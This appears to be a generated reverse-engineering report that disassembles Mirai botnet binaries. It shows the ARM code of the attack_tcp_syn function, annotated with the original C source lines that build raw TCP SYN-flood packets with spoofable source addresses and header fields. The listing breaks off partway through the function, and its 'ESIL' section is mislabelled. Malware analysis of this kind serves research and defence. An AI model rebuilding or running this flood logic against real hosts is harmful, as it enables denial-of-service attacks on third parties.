@@ -1,0 +1,1597 @@
+ESIL Analysis Report
+==================================================
+
+ARM Binary: ../output_arm/mirai.arm
+MIPS Binary: ../output_mips/mirai.mips
+
+=== ARM Analysis ===
+Function address: 0x16c98
+
+ESIL:
+; CODE XREF from dbg.__udivsi3 @ 0x1ea30(x)
+; CODE XREF from dbg.__aeabi_uidivmod @ 0x1ead4(x)
+0x0001eac4      000050e3       cmp r0, 0                               ; lib1funcs.S:1130 ; arg1
+0x0001eac8      0000e013       mvnne r0, 0
+0x0001eacc      460000ea       b dbg.__aeabi_ldiv0
+  ;-- __aeabi_ldiv0:
+  ;-- __aeabi_idiv0:
+  ; CODE XREF from dbg.__aeabi_uidivmod @ 0x1eacc(x)
+  ; CODE XREF from dbg.__divsi3 @ 0x1ebc8(x)
+16: dbg.__aeabi_ldiv0 ();
+0x0001ebec      02402de9       push {r1, lr}                           ; lib1funcs.S:1380 ; void __aeabi_ldiv0();
+0x0001ebf0      0800a0e3       mov r0, 8                               ; lib1funcs.S:1498 ; int32_t arg1
+0x0001ebf4      e10100eb       bl dbg.raise                            ; lib1funcs.S:1499 ; int raise(int sig)
+  ;-- gsignal:
+  ;-- raise:
+  ; CALL XREFS from dbg.abort @ 0x1025c(x), 0x1033c(x)
+  ; CALL XREF from dbg.main @ 0x1ba84(x)
+  ; CALL XREF from dbg.__aeabi_ldiv0 @ 0x1ebf4(x)
+60: int dbg.raise (int sig);
+`- args(r0)
+0x0001f380      10402de9       push {r4, lr}                           ; signal.c:49} ; int raise(int sig);
+0x0001f384      0040a0e1       mov r4, r0                              ; raise.c:25{ ; arg1
+0x0001f388      500600eb       bl dbg.__pthread_self                   ; raise.c:26  int ret = __pthread_kill (__pthread_self (), sig);
+  ;-- pthread_self:
+  ;-- __pthread_self:
+  ; CALL XREF from dbg.raise @ 0x1f388(x)
+16: dbg.__pthread_self (int32_t arg1);
+`- args(r0)
+0x00020cd0      04e02de5       str lr, [sp, -4]!                       ; pthread_kill.c:90} ; pthread_t __pthread_self();
+0x00020cd4      71f9ffeb       bl dbg.__aeabi_read_tp                  ; pthread_self.c:24  return (pthread_t) THREAD_SELF;
+  ;-- __aeabi_read_tp:
+  ; XREFS(385)
+16: dbg.__aeabi_read_tp (int32_t arg1);
+`- args(r0)
+0x0001f2a0      0f0ae0e3       mvn r0, 0xf000                          ; errno-loc.c:27} ; void __aeabi_read_tp();
+0x0001f2a4      1ff040e2       sub pc, r0, 0x1f                        ; aeabi_read_tp.S:53 sub pc, r0, #31 ; arg1
+0x0001f2a8      00000000       invalid                                 ; arg1
+
+
+Disassembly:
+  ;-- attack_tcp_syn:
+  ; DATA XREF from dbg.attack_init @ 0x16380(r)
+  ; NULL XREF from sym.attack_init @ +0x9c(r)
+┌ 2364: dbg.attack_tcp_syn (int32_t arg1, int32_t arg2);
+│ `- args(r0, r1) vars(47:sp[0x4..0x70])
+; void attack_tcp_syn(uint8_t targs_len,attack_target * targs,uint8_t
+; opts_len,attack_option * opts);
+│ 0x00016c98      10482de9       push {r4, fp, lr}                     ; attack.c:250}
+│ 0x00016c9c      08b08de2       add fp, var_8h
+│ 0x00016ca0      64d04de2       sub sp, sp, 0x64
+│ 0x00016ca4      5c100be5       str r1, [var_5ch]                     ; 0x5c ; 92 ; arg2
+│ 0x00016ca8      60300be5       str r3, [var_60h]                     ; 0x60 ; 96
+│ 0x00016cac      0030a0e1       mov r3, r0                            ; arg1
+│ 0x00016cb0      55304be5       strb r3, [var_55h]                    ; 0x55 ; 85
+│ 0x00016cb4      0230a0e1       mov r3, r2
+│ 0x00016cb8      56304be5       strb r3, [var_56h]                    ; 0x56 ; 86
+│ 0x00016cbc      55305be5       ldrb r3, [var_55h]                    ; attack_tcp.c:21    char **pkts = calloc(targs_len, sizeof (char *)); ; 0x55 ; 85
+│ 0x00016cc0      0410a0e3       mov r1, 4
+│ 0x00016cc4      0300a0e1       mov r0, r3                            ; int32_t arg1
+│ 0x00016cc8      643f00eb       bl dbg.__libc_calloc                  ; void *calloc(size_t nmeb, size_t size)
+│ 0x00016ccc      0030a0e1       mov r3, r0
+│ 0x00016cd0      10300be5       str r3, [var_10h]                     ; 0x10 ; 16
+│ 0x00016cd4      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:22    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016cd8      0030a0e3       mov r3, 0
+│ 0x00016cdc      0220a0e3       mov r2, 2
+│ 0x00016ce0      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016ce4      62ffffeb       bl dbg.attack_get_opt_int
+│ 0x00016ce8      0030a0e1       mov r3, r0
+│ 0x00016cec      11304be5       strb r3, [var_11h]                    ; 0x11 ; 17
+│ 0x00016cf0      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:23    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016cf4      d8389fe5       ldr r3, [0x000175d4]                  ; [0x175d4:4]=0xffff
+│ 0x00016cf8      0320a0e3       mov r2, 3
+│ 0x00016cfc      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016d00      5bffffeb       bl dbg.attack_get_opt_int
+│ 0x00016d04      0030a0e1       mov r3, r0
+│ 0x00016d08      b4314be1       strh r3, [seq]                        ; 0x14 ; 20
+│ 0x00016d0c      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:24    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016d10      4030a0e3       mov r3, 0x40                          ; '@'
+│ 0x00016d14      0420a0e3       mov r2, 4
+│ 0x00016d18      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016d1c      54ffffeb       bl dbg.attack_get_opt_int
+│ 0x00016d20      0030a0e1       mov r3, r0
+│ 0x00016d24      15304be5       strb r3, [var_15h]                    ; 0x15 ; 21
+│ 0x00016d28      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:25    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016d2c      0130a0e3       mov r3, 1
+│ 0x00016d30      0520a0e3       mov r2, 5
+│ 0x00016d34      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016d38      4dffffeb       bl dbg.attack_get_opt_int
+│ 0x00016d3c      0030a0e1       mov r3, r0
+│ 0x00016d40      16304be5       strb r3, [var_16h]                    ; 0x16 ; 22
+│ 0x00016d44      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:26    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016d48      84389fe5       ldr r3, [0x000175d4]                  ; [0x175d4:4]=0xffff
+│ 0x00016d4c      0620a0e3       mov r2, 6
+│ 0x00016d50      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016d54      46ffffeb       bl dbg.attack_get_opt_int
+│ 0x00016d58      0030a0e1       mov r3, r0
+│ 0x00016d5c      b8314be1       strh r3, [ack]                        ; 0x18 ; 24
+│ 0x00016d60      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:27    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016d64      68389fe5       ldr r3, [0x000175d4]                  ; [0x175d4:4]=0xffff
+│ 0x00016d68      0720a0e3       mov r2, 7
+│ 0x00016d6c      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016d70      3fffffeb       bl dbg.attack_get_opt_int
+│ 0x00016d74      0030a0e1       mov r3, r0
+│ 0x00016d78      ba314be1       strh r3, [ack_fl]                     ; 0x1a ; 26
+│ 0x00016d7c      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:28    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016d80      4c389fe5       ldr r3, [0x000175d4]                  ; [0x175d4:4]=0xffff
+│ 0x00016d84      1120a0e3       mov r2, 0x11
+│ 0x00016d88      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016d8c      38ffffeb       bl dbg.attack_get_opt_int
+│ 0x00016d90      0030a0e1       mov r3, r0
+│ 0x00016d94      20300be5       str r3, [var_20h]                     ; 0x20 ; 32
+│ 0x00016d98      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:29    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016d9c      0030a0e3       mov r3, 0
+│ 0x00016da0      1220a0e3       mov r2, 0x12
+│ 0x00016da4      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016da8      31ffffeb       bl dbg.attack_get_opt_int
+│ 0x00016dac      0030a0e1       mov r3, r0
+│ 0x00016db0      24300be5       str r3, [source_ip]                   ; 0x24 ; 36
+│ 0x00016db4      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:30    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016db8      0030a0e3       mov r3, 0
+│ 0x00016dbc      0b20a0e3       mov r2, 0xb
+│ 0x00016dc0      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016dc4      2affffeb       bl dbg.attack_get_opt_int
+│ 0x00016dc8      0030a0e1       mov r3, r0
+│ 0x00016dcc      25304be5       strb r3, [var_25h]                    ; 0x25 ; 37
+│ 0x00016dd0      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:31    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016dd4      0030a0e3       mov r3, 0
+│ 0x00016dd8      0c20a0e3       mov r2, 0xc
+│ 0x00016ddc      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016de0      23ffffeb       bl dbg.attack_get_opt_int
+│ 0x00016de4      0030a0e1       mov r3, r0
+│ 0x00016de8      26304be5       strb r3, [var_26h]                    ; 0x26 ; 38
+│ 0x00016dec      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:32    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016df0      0030a0e3       mov r3, 0
+│ 0x00016df4      0d20a0e3       mov r2, 0xd
+│ 0x00016df8      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016dfc      1cffffeb       bl dbg.attack_get_opt_int
+│ 0x00016e00      0030a0e1       mov r3, r0
+│ 0x00016e04      27304be5       strb r3, [var_27h]                    ; 0x27 ; 39
+│ 0x00016e08      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:33    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016e0c      0030a0e3       mov r3, 0
+│ 0x00016e10      0e20a0e3       mov r2, 0xe
+│ 0x00016e14      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016e18      15ffffeb       bl dbg.attack_get_opt_int
+│ 0x00016e1c      0030a0e1       mov r3, r0
+│ 0x00016e20      28304be5       strb r3, [fd]                         ; 0x28 ; 40
+│ 0x00016e24      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:34    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016e28      0130a0e3       mov r3, 1
+│ 0x00016e2c      0f20a0e3       mov r2, 0xf
+│ 0x00016e30      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016e34      0effffeb       bl dbg.attack_get_opt_int
+│ 0x00016e38      0030a0e1       mov r3, r0
+│ 0x00016e3c      29304be5       strb r3, [var_29h]                    ; 0x29 ; 41
+│ 0x00016e40      56005be5       ldrb r0, [var_56h]                    ; attack_tcp.c:35    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE); ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016e44      0030a0e3       mov r3, 0
+│ 0x00016e48      1020a0e3       mov r2, 0x10
+│ 0x00016e4c      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016e50      07ffffeb       bl dbg.attack_get_opt_int
+│ 0x00016e54      0030a0e1       mov r3, r0
+│ 0x00016e58      2a304be5       strb r3, [var_2ah]                    ; 0x2a ; 42
+│ 0x00016e5c      74379fe5       ldr r3, obj.LOCAL_ADDR                ; attack_tcp.c:36    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR); ; [0x8ff90:4]=0
+│ 0x00016e60      003093e5       ldr r3, [r3]                          ; 0x8ff90
+│                                                                      ; obj.LOCAL_ADDR
+│ 0x00016e64      56005be5       ldrb r0, [var_56h]                    ; 0x56 ; 86 ; int32_t arg1
+│ 0x00016e68      1920a0e3       mov r2, 0x19
+│ 0x00016e6c      60101be5       ldr r1, [var_60h]                     ; 0x60 ; 96 ; int32_t arg2
+│ 0x00016e70      1affffeb       bl dbg.attack_get_opt_ip
+│ 0x00016e74      30000be5       str r0, [iph]                         ; 0x30 ; 48
+│ 0x00016e78      0620a0e3       mov r2, 6                             ; attack_tcp.c:38    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+│ 0x00016e7c      0310a0e3       mov r1, 3                             ; int type
+│ 0x00016e80      0200a0e3       mov r0, 2                             ; int domain
+│ 0x00016e84      4d5300eb       bl dbg.__socket
+│ 0x00016e88      34000be5       str r0, [tcph]                        ; elf_phdr
+│                                                                      ; 0x34
+│ 0x00016e8c      34301be5       ldr r3, [tcph]                        ; elf_phdr
+│                                                                      ; 0x34
+│ 0x00016e90      010073e3       cmn r3, 1                             ; 1
+│ 0x00016e94      cb01000a       beq 0x175c8
+| // true: 0x000175c8  false: 0x00016e98
+│ 0x00016e98      0130a0e3       mov r3, 1                             ; attack_tcp.c:46    i = 1;
+│ 0x00016e9c      50300be5       str r3, [targs]                       ; 0x50 ; 80
+│ 0x00016ea0      50304be2       sub r3, targs                         ; attack_tcp.c:47    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+│ 0x00016ea4      0420a0e3       mov r2, 4
+│ 0x00016ea8      00208de5       str r2, [sp]
+│ 0x00016eac      0320a0e3       mov r2, 3
+│ 0x00016eb0      0010a0e3       mov r1, 0                             ; int32_t arg_ch
+│ 0x00016eb4      34001be5       ldr r0, [tcph]                        ; elf_phdr
+│                                                                      ; 0x34 ; int32_t arg1
+│ 0x00016eb8      2c5300eb       bl dbg.__setsockopt
+│ 0x00016ebc      0030a0e1       mov r3, r0
+│ 0x00016ec0      010073e3       cmn r3, 1                             ; 1
+│ 0x00016ec4      0200001a       bne 0x16ed4
+| // true: 0x00016ed4  false: 0x00016ec8
+│ 0x00016ec8      34001be5       ldr r0, [tcph]                        ; attack_tcp.c:52        close(fd); ; elf_phdr
+│                                                                      ; 0x34 ; int fildes
+│ 0x00016ecc      924a00eb       bl sym.__libc_close                   ; int close(int fildes)
+│ 0x00016ed0      bd0100ea       b 0x175cc                             ; attack_tcp.c:53        return;
+| // true: 0x000175cc
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x16ec4(x)
+│ 0x00016ed4      0030a0e3       mov r3, 0                             ; attack_tcp.c:56    for (i = 0; i < targs_len; i++)
+│ 0x00016ed8      50300be5       str r3, [targs]                       ; 0x50 ; 80
+│ 0x00016edc      fe0000ea       b 0x172dc
+| // true: 0x000172dc
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x172e8(x)
+│ 0x00016ee0      50301be5       ldr r3, [targs]                       ; attack_tcp.c:62        pkts[i] = calloc(128, sizeof (char)); ; 0x50 ; 80
+│ 0x00016ee4      0331a0e1       lsl r3, r3, 2
+│ 0x00016ee8      10201be5       ldr r2, [var_10h]                     ; 0x10 ; 16
+│ 0x00016eec      034082e0       add r4, r2, r3
+│ 0x00016ef0      0110a0e3       mov r1, 1
+│ 0x00016ef4      8000a0e3       mov r0, 0x80                          ; int32_t arg1
+│ 0x00016ef8      d83e00eb       bl dbg.__libc_calloc                  ; void *calloc(size_t nmeb, size_t size)
+│ 0x00016efc      0030a0e1       mov r3, r0
+│ 0x00016f00      003084e5       str r3, [r4]
+│ 0x00016f04      50301be5       ldr r3, [targs]                       ; attack_tcp.c:63        iph = (struct iphdr *)pkts[i]; ; 0x50 ; 80
+│ 0x00016f08      0331a0e1       lsl r3, r3, 2
+│ 0x00016f0c      10201be5       ldr r2, [var_10h]                     ; 0x10 ; 16
+│ 0x00016f10      033082e0       add r3, r2, r3
+│ 0x00016f14      003093e5       ldr r3, [r3]
+│ 0x00016f18      44300be5       str r3, [i]                           ; 0x44 ; 68
+│ 0x00016f1c      44301be5       ldr r3, [i]                           ; attack_tcp.c:64        tcph = (struct tcphdr *)(iph + 1); ; 0x44 ; 68
+│ 0x00016f20      143083e2       add r3, r3, 0x14
+│ 0x00016f24      48300be5       str r3, [var_48h]                     ; 0x48 ; 72
+│ 0x00016f28      48301be5       ldr r3, [var_48h]                     ; attack_tcp.c:65        opts = (uint8_t *)(tcph + 1); ; 0x48 ; 72
+│ 0x00016f2c      143083e2       add r3, r3, 0x14
+│ 0x00016f30      4c300be5       str r3, [var_4ch]                     ; 0x4c ; 76
+│ 0x00016f34      44201be5       ldr r2, [i]                           ; attack_tcp.c:67        iph->version = 4; ; 0x44 ; 68
+│ 0x00016f38      0030d2e5       ldrb r3, [r2]
+│ 0x00016f3c      b030c3e3       bic r3, r3, 0xb0
+│ 0x00016f40      403083e3       orr r3, r3, 0x40
+│ 0x00016f44      0030c2e5       strb r3, [r2]
+│ 0x00016f48      44201be5       ldr r2, [i]                           ; attack_tcp.c:68        iph->ihl = 5; ; 0x44 ; 68
+│ 0x00016f4c      0030d2e5       ldrb r3, [r2]
+│ 0x00016f50      0a30c3e3       bic r3, r3, 0xa
+│ 0x00016f54      053083e3       orr r3, r3, 5
+│ 0x00016f58      0030c2e5       strb r3, [r2]
+│ 0x00016f5c      44301be5       ldr r3, [i]                           ; attack_tcp.c:69        iph->tos = ip_tos; ; 0x44 ; 68
+│ 0x00016f60      11205be5       ldrb r2, [var_11h]                    ; 0x11 ; 17
+│ 0x00016f64      0120c3e5       strb r2, [r3, 1]
+│ 0x00016f68      3c00a0e3       mov r0, 0x3c                          ; attack_tcp.c:70        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20); ; '<' ; int32_t arg1
+│ 0x00016f6c      205300eb       bl dbg.htons
+│ 0x00016f70      0030a0e1       mov r3, r0
+│ 0x00016f74      0320a0e1       mov r2, r3
+│ 0x00016f78      44301be5       ldr r3, [i]                           ; 0x44 ; 68
+│ 0x00016f7c      b220c3e1       strh r2, [r3, 2]
+│ 0x00016f80      b4315be1       ldrh r3, [seq]                        ; attack_tcp.c:71        iph->id = htons(ip_ident); ; 0x14 ; 20
+│ 0x00016f84      0300a0e1       mov r0, r3                            ; int32_t arg1
+│ 0x00016f88      195300eb       bl dbg.htons
+│ 0x00016f8c      0030a0e1       mov r3, r0
+│ 0x00016f90      0320a0e1       mov r2, r3
+│ 0x00016f94      44301be5       ldr r3, [i]                           ; 0x44 ; 68
+│ 0x00016f98      b420c3e1       strh r2, [r3, 4]
+│ 0x00016f9c      44301be5       ldr r3, [i]                           ; attack_tcp.c:72        iph->ttl = ip_ttl; ; 0x44 ; 68
+│ 0x00016fa0      15205be5       ldrb r2, [var_15h]                    ; 0x15 ; 21
+│ 0x00016fa4      0820c3e5       strb r2, [r3, 8]
+│ 0x00016fa8      16305be5       ldrb r3, [var_16h]                    ; attack_tcp.c:73        if (dont_frag) ; 0x16 ; 22
+│ 0x00016fac      000053e3       cmp r3, 0
+│ 0x00016fb0      0500000a       beq 0x16fcc
+| // true: 0x00016fcc  false: 0x00016fb4
+│ 0x00016fb4      0109a0e3       mov r0, 0x4000                        ; attack_tcp.c:74            iph->frag_off = htons(1 << 14); ; int32_t arg1
+│ 0x00016fb8      0d5300eb       bl dbg.htons
+│ 0x00016fbc      0030a0e1       mov r3, r0
+│ 0x00016fc0      0320a0e1       mov r2, r3
+│ 0x00016fc4      44301be5       ldr r3, [i]                           ; 0x44 ; 68
+│ 0x00016fc8      b620c3e1       strh r2, [r3, 6]
+| // true: 0x00016fcc
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x16fb0(x)
+│ 0x00016fcc      44301be5       ldr r3, [i]                           ; attack_tcp.c:75        iph->protocol = IPPROTO_TCP; ; 0x44 ; 68
+│ 0x00016fd0      0620a0e3       mov r2, 6
+│ 0x00016fd4      0920c3e5       strb r2, [r3, 9]
+│ 0x00016fd8      44301be5       ldr r3, [i]                           ; attack_tcp.c:76        iph->saddr = source_ip; ; 0x44 ; 68
+│ 0x00016fdc      30201be5       ldr r2, [iph]                         ; 0x30 ; 48
+│ 0x00016fe0      0c2083e5       str r2, [r3, 0xc]
+│ 0x00016fe4      50301be5       ldr r3, [targs]                       ; attack_tcp.c:77        iph->daddr = targs[i].addr; ; 0x50 ; 80
+│ 0x00016fe8      0320a0e1       mov r2, r3
+│ 0x00016fec      0230a0e1       mov r3, r2
+│ 0x00016ff0      8330a0e1       lsl r3, r3, 1
+│ 0x00016ff4      023083e0       add r3, r3, r2
+│ 0x00016ff8      8331a0e1       lsl r3, r3, 3
+│ 0x00016ffc      0320a0e1       mov r2, r3
+│ 0x00017000      5c301be5       ldr r3, [var_5ch]                     ; 0x5c ; 92
+│ 0x00017004      023083e0       add r3, r3, r2
+│ 0x00017008      102093e5       ldr r2, [r3, 0x10]
+│ 0x0001700c      44301be5       ldr r3, [i]                           ; 0x44 ; 68
+│ 0x00017010      102083e5       str r2, [r3, 0x10]
+│ 0x00017014      b8315be1       ldrh r3, [ack]                        ; attack_tcp.c:79        tcph->source = htons(sport); ; 0x18 ; 24
+│ 0x00017018      0300a0e1       mov r0, r3                            ; int32_t arg1
+│ 0x0001701c      f45200eb       bl dbg.htons
+│ 0x00017020      0030a0e1       mov r3, r0
+│ 0x00017024      0320a0e1       mov r2, r3
+│ 0x00017028      48301be5       ldr r3, [var_48h]                     ; 0x48 ; 72
+│ 0x0001702c      b020c3e1       strh r2, [r3]
+│ 0x00017030      ba315be1       ldrh r3, [ack_fl]                     ; attack_tcp.c:80        tcph->dest = htons(dport); ; 0x1a ; 26
+│ 0x00017034      0300a0e1       mov r0, r3                            ; int32_t arg1
+│ 0x00017038      ed5200eb       bl dbg.htons
+│ 0x0001703c      0030a0e1       mov r3, r0
+│ 0x00017040      0320a0e1       mov r2, r3
+│ 0x00017044      48301be5       ldr r3, [var_48h]                     ; 0x48 ; 72
+│ 0x00017048      b220c3e1       strh r2, [r3, 2]
+│ 0x0001704c      20301be5       ldr r3, [var_20h]                     ; attack_tcp.c:81        tcph->seq = htons(seq); ; 0x20 ; 32
+│ 0x00017050      0338a0e1       lsl r3, r3, 0x10
+│ 0x00017054      2338a0e1       lsr r3, r3, 0x10
+│ 0x00017058      0300a0e1       mov r0, r3                            ; int32_t arg1
+│ 0x0001705c      e45200eb       bl dbg.htons
+│ 0x00017060      0030a0e1       mov r3, r0
+│ 0x00017064      0320a0e1       mov r2, r3
+│ 0x00017068      48301be5       ldr r3, [var_48h]                     ; 0x48 ; 72
+│ 0x0001706c      042083e5       str r2, [r3, 4]
+│ 0x00017070      48201be5       ldr r2, [var_48h]                     ; attack_tcp.c:82        tcph->doff = 10; ; 0x48 ; 72
+│ 0x00017074      0c30d2e5       ldrb r3, [r2, 0xc]
+│ 0x00017078      5030c3e3       bic r3, r3, 0x50
+│ 0x0001707c      a03083e3       orr r3, r3, 0xa0
+│ 0x00017080      0c30c2e5       strb r3, [r2, 0xc]
+│ 0x00017084      25305be5       ldrb r3, [var_25h]                    ; attack_tcp.c:83        tcph->urg = urg_fl; ; 0x25 ; 37
+│ 0x00017088      013003e2       and r3, r3, 1
+│ 0x0001708c      ff3003e2       and r3, r3, 0xff
+│ 0x00017090      48101be5       ldr r1, [var_48h]                     ; 0x48 ; 72
+│ 0x00017094      0d20d1e5       ldrb r2, [r1, 0xd]
+│ 0x00017098      013003e2       and r3, r3, 1
+│ 0x0001709c      2020c2e3       bic r2, r2, 0x20
+│ 0x000170a0      8332a0e1       lsl r3, r3, 5
+│ 0x000170a4      023083e1       orr r3, r3, r2
+│ 0x000170a8      0320a0e1       mov r2, r3
+│ 0x000170ac      0d20c1e5       strb r2, [r1, 0xd]
+│ 0x000170b0      26305be5       ldrb r3, [var_26h]                    ; attack_tcp.c:84        tcph->ack = ack_fl; ; 0x26 ; 38
+│ 0x000170b4      013003e2       and r3, r3, 1
+│ 0x000170b8      ff3003e2       and r3, r3, 0xff
+│ 0x000170bc      48101be5       ldr r1, [var_48h]                     ; 0x48 ; 72
+│ 0x000170c0      0d20d1e5       ldrb r2, [r1, 0xd]
+│ 0x000170c4      013003e2       and r3, r3, 1
+│ 0x000170c8      1020c2e3       bic r2, r2, 0x10
+│ 0x000170cc      0332a0e1       lsl r3, r3, 4
+│ 0x000170d0      023083e1       orr r3, r3, r2
+│ 0x000170d4      0320a0e1       mov r2, r3
+│ 0x000170d8      0d20c1e5       strb r2, [r1, 0xd]
+│ 0x000170dc      27305be5       ldrb r3, [var_27h]                    ; attack_tcp.c:85        tcph->psh = psh_fl; ; 0x27 ; 39
+│ 0x000170e0      013003e2       and r3, r3, 1
+│ 0x000170e4      ff3003e2       and r3, r3, 0xff
+│ 0x000170e8      48101be5       ldr r1, [var_48h]                     ; 0x48 ; 72
+│ 0x000170ec      0d20d1e5       ldrb r2, [r1, 0xd]
+│ 0x000170f0      013003e2       and r3, r3, 1
+│ 0x000170f4      0820c2e3       bic r2, r2, 8
+│ 0x000170f8      8331a0e1       lsl r3, r3, 3
+│ 0x000170fc      023083e1       orr r3, r3, r2
+│ 0x00017100      0320a0e1       mov r2, r3
+│ 0x00017104      0d20c1e5       strb r2, [r1, 0xd]
+│ 0x00017108      28305be5       ldrb r3, [fd]                         ; attack_tcp.c:86        tcph->rst = rst_fl; ; 0x28 ; 40
+│ 0x0001710c      013003e2       and r3, r3, 1
+│ 0x00017110      ff3003e2       and r3, r3, 0xff
+│ 0x00017114      48101be5       ldr r1, [var_48h]                     ; 0x48 ; 72
+│ 0x00017118      0d20d1e5       ldrb r2, [r1, 0xd]
+│ 0x0001711c      013003e2       and r3, r3, 1
+│ 0x00017120      0420c2e3       bic r2, r2, 4
+│ 0x00017124      0331a0e1       lsl r3, r3, 2
+│ 0x00017128      023083e1       orr r3, r3, r2
+│ 0x0001712c      0320a0e1       mov r2, r3
+│ 0x00017130      0d20c1e5       strb r2, [r1, 0xd]
+│ 0x00017134      29305be5       ldrb r3, [var_29h]                    ; attack_tcp.c:87        tcph->syn = syn_fl; ; 0x29 ; 41
+│ 0x00017138      013003e2       and r3, r3, 1
+│ 0x0001713c      ff3003e2       and r3, r3, 0xff
+│ 0x00017140      48101be5       ldr r1, [var_48h]                     ; 0x48 ; 72
+│ 0x00017144      0d20d1e5       ldrb r2, [r1, 0xd]
+│ 0x00017148      013003e2       and r3, r3, 1
+│ 0x0001714c      0220c2e3       bic r2, r2, 2
+│ 0x00017150      8330a0e1       lsl r3, r3, 1
+│ 0x00017154      023083e1       orr r3, r3, r2
+│ 0x00017158      0320a0e1       mov r2, r3
+│ 0x0001715c      0d20c1e5       strb r2, [r1, 0xd]
+│ 0x00017160      2a305be5       ldrb r3, [var_2ah]                    ; attack_tcp.c:88        tcph->fin = fin_fl; ; 0x2a ; 42
+│ 0x00017164      013003e2       and r3, r3, 1
+│ 0x00017168      ff1003e2       and r1, r3, 0xff
+│ 0x0001716c      48201be5       ldr r2, [var_48h]                     ; 0x48 ; 72
+│ 0x00017170      0d30d2e5       ldrb r3, [r2, 0xd]
+│ 0x00017174      011001e2       and r1, r1, 1
+│ 0x00017178      0130c3e3       bic r3, r3, 1
+│ 0x0001717c      033081e1       orr r3, r1, r3
+│ 0x00017180      0d30c2e5       strb r3, [r2, 0xd]
+│ 0x00017184      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:91        *opts++ = PROTO_TCP_OPT_MSS;    // Kind ; 0x4c ; 76
+│ 0x00017188      012083e2       add r2, r3, 1
+│ 0x0001718c      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x00017190      0220a0e3       mov r2, 2
+│ 0x00017194      0020c3e5       strb r2, [r3]
+│ 0x00017198      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:92        *opts++ = 4;                    // Length ; 0x4c ; 76
+│ 0x0001719c      012083e2       add r2, r3, 1
+│ 0x000171a0      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x000171a4      0420a0e3       mov r2, 4
